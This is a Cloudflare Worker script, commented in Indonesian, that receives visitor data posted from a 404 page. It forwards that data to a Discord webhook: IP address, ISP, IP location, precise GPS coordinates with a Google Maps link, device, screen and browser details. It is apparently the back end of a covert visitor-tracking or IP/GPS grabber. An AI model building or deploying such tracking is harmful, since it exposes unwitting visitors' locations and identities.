/**
 * Cloudflare Worker — Isekai Discord Notifier
 * Terima POST JSON dari 404.html → kirim ke Discord webhook.
 * DISCORD_WEBHOOK_URL disimpan sebagai Worker Secret.
 */

const ALLOWED_ORIGIN = "*";

const CORS_HEADERS = {
  "Access-Control-Allow-Origin": ALLOWED_ORIGIN,
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

function s(v, max = 200) {
  if (v == null) return "tidak diketahui";
  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").slice(0, max);
}

export default {
  async fetch(request, env) {
    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: CORS_HEADERS });
    }

    if (request.method !== "POST") {
      return new Response("Method Not Allowed", { status: 405, headers: CORS_HEADERS });
    }

    const ct = request.headers.get("Content-Type") || "";
    if (!ct.includes("application/json")) {
      return new Response("Bad Request", { status: 400, headers: CORS_HEADERS });
    }

    let data;
    try {
      data = await request.json();
    } catch {
      return new Response("Invalid JSON", { status: 400, headers: CORS_HEADERS });
    }

    const webhookUrl = env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
      return new Response("OK (no webhook configured)", { status: 200, headers: CORS_HEADERS });
    }

    // Format waktu WIB
    let waktu = "tidak diketahui";
    try {
      waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }) + " WIB";
    } catch (_) {}

    // GPS → link Google Maps kalau ada
    let gpsLine = null;
    const lat = parseFloat(data.gpsLat);
    const lon = parseFloat(data.gpsLon);
    const acc = parseInt(data.gpsAcc, 10);
    if (!isNaN(lat) && !isNaN(lon)) {
      const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
      gpsLine = `📡 GPS Tepat: ${lat.toFixed(5)}, ${lon.toFixed(5)}${!isNaN(acc) ? ` (±${acc}m)` : ""} → ${mapsUrl}`;
    }

    const lines = [
      "🌸 **Pengunjung tersesat baru terdeteksi!**",
      `⏰ Waktu: ${waktu}`,
      `🌐 IP: \`${s(data.ip, 45)}\``,
      `🏢 ISP/Guild: ${s(data.isp)}`,
      `📍 Lokasi (IP): ${s(data.lokasi)}`,
      gpsLine,
      `🕐 Zona Waktu: ${s(data.timezone)}`,
      `💻 Platform: ${s(data.platform)}`,
      `🌍 Bahasa: ${s(data.language, 20)}`,
      `🖥️ Resolusi: ${s(data.screenW, 10)}x${s(data.screenH, 10)} (${s(data.pixelRatio, 5)}x)`,
      `🔗 URL: ${s(data.url, 300)}`,
      data.referrer ? `↩️ Referrer: ${s(data.referrer, 300)}` : null,
      `📱 Device: ${s(data.userAgent, 200)}`,
    ].filter(Boolean).join("\n");

    const payload = {
      username: "Isekai Guild 🎴",
      content: lines.slice(0, 2000),
    };

    try {
      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      if (!res.ok) {
        console.error("Discord webhook error:", res.status);
      }
    } catch (err) {
      console.error("Fetch error:", err);
    }

    return new Response("OK", { status: 200, headers: CORS_HEADERS });
  },
};
